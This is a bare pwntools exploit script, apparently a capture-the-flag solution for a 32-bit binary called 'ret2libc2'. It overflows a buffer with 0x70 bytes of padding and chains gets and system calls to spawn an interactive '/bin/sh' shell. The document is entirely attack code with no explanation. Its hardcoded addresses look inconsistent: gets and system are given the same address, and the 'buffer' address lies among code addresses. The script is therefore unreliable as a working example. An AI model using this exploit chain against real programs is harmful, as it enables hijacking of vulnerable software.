from pwn import *

sh = process('./ret2libc2')

gets_plt = 0x8048460
buf2_adr = 0x8048490
system_plt = 0x8048460
pop_ret = 0x804843d

payload = flat(['a' * 0x70, gets_plt, system_plt, buf2_adr, buf2_adr])
#payload2 = flat(['a' * 0x70, gets_plt, pop_ret, buf2_adr, system_plt, 'a' * 4, buf2_adr])
sh.sendline(payload)
sh.sendline("/bin/sh")

sh.interactive()